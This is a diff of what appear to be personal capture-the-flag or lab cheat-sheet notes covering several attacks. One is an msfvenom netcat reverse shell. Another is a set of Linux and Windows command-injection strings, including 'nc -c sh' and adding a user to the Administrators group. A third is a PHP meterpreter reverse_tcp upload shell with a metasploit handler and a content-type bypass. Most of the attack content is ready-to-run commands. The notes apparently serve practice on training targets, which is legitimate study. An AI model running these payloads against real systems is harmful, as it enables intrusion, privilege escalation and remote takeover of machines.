@@ -234,10 +234,10 @@ To get an rsa key to work chmod 600 id_rsa
 --Telnet prompt--
 .RUN ping {attacker IP} -c 1
 
-—new tab—-
+-—New attack—-
 >msfvenom -l payloads | grep netcat
 >msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444
-Copy generated payload
+Copy generated payload string
 >nc -lnvp 444 (to listen for the reverse shell)
 —-
 On target machine through telnet prompt
@@ -337,34 +337,47 @@ Open Stego (download)
 https://georgeom.net/StegOnline/upload (online)
 
 # Command Injection - Linux
+If a website allow you to execute a command then possibly able to command inject
+View the source to check for sanitisation
+
+For example if an application allows you to ping an address:
 ```
 Easy/Medium (only some will work)
 >127.0.0.1 && ls 
 >127.0.0.1 & ls 
 >127.0.0.1 ; ls 
 >127.0.0.1 | ls 
->127.0.0.1 && nc ‐c sh 127.0.0.1 9001 (after using >nc -lnvp)
+>127.0.0.1 && nc ‐c sh 127.0.0.1 9001 (after starting listener using >nc -lnvp 9001)
 
 Hard (use typos)
 >127.0.0.1 |ls
 ```
 
 # Command Injection - Windows
+As above but with different commands
 ```
->Hostname
->Whoami
->Tasklist
->Taskkill /PID 3112 /F   //forcefully kills the processes
->dir c:\
->net user
->net user test /add     //add a new user
->net localgroup Administrators test /add    //add test user to administrators
->net user test     //to view the details of the user
->dir c:\ "pin.txt" or this command ! Take pin.txt   //to get content
->type c:\"pin.txt“   //to get the content of a file
+>127.0.0.1 && dir 
+>127.0.0.1 & dir 
+>127.0.0.1 ; dir 
+>127.0.0.1 | dir 
+```
+
+```
+>|Hostname
+>|Whoami
+>|tasklist
+>|taskkill /PID 3112 /F   //forcefully kills the processes
+>|dir c:\
+>|net user
+>|net user test /add     //add a new user
+>|net localgroup Administrators test /add    //add test user to administrators
+>|net user test     //to view the details of the user
+>|dir c:\ "pin.txt" or this command >! Take pin.txt   //to get content
+>|type c:\"pin.txt“   //to get the content of a file
 ```
 
 # File Upload
+If a website allows file upload then create a file to upload
 ```
 >msfvenom ‐p php/meterpreter/reverse_tcp LHOST={myIP}  LPORT=4444 ‐f raw >exploit.php
 >use exploit/multi/handler 
@@ -373,7 +386,23 @@ Upload to server
 Access on server (through web browser)
 Then can execute commands, and rm to remove
 
-If harder then use burp to try to upload, capture, then set content type
+If harder then use burp to try to upload, capture, then set content type to image/jpeg (or whatever)
+```
+
+```
+Start metasploit
+>search handler (looking for multi/handler)
+>use {id or name}
+>use exploit/multi/handler 
+>set payload  >php/meterpreter/reverse_tcp (to listen for reverse shell
+>options
+>set LHOST {local}
+>run
+>msfvenom -l payloads | grep php
+>msfvenom ‐p php/meterpreter/reverse_tcp LHOST={myIP}  LPORT=4444 ‐f raw >exploit.php
+Upload to server
+Access on server (through web browser)
+Then can execute commands, and rm to remove
 ```
 
 #Brute forcing on DVWA with Burp and Hydra
